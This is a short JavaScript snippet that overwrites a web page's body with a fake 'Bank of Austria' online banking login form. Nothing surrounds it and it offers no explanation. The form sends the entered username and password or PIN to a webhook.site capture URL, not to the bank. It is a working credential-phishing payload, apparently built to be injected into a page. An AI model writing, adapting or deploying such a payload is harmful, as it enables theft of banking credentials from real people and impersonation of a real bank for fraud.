document.body.innerHTML = `
<div style="font-family: Arial, sans-serif; max-width: 500px; margin: 60px auto; padding: 30px; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); background: white;">
  <h2 style="text-align:center; color: #003087;">Bank of Austria</h2>
  <p style="text-align:center; color: #444;">Welcome to Online Banking</p>
  <p style="text-align:center; color: #d32f2f; font-weight:bold;">Please log in to continue</p>
  
  <form action="https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5" method="POST" style="display:flex; flex-direction:column; gap:15px;">
    <label for="username">Username / Customer number</label>
    <input type="text" id="username" name="username" placeholder="Enter your username" required style="padding:12px; border:1px solid #999; border-radius:4px; font-size:16px;">
    
    <label for="password">Password / PIN</label>
    <input type="password" id="password" name="password" placeholder="Enter your password" required style="padding:12px; border:1px solid #999; border-radius:4px; font-size:16px;">
    
    <input type="submit" value="Login" style="padding:12px; background:#003087; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer;">
  </form>
  
  <p style="text-align:center; margin-top:20px; font-size:14px; color:#555;">
    <a href="#" style="color:#003087;">Forgot your password?</a> | 
    <a href="#" style="color:#003087;">Register now</a>
  </p>
</div>
`;
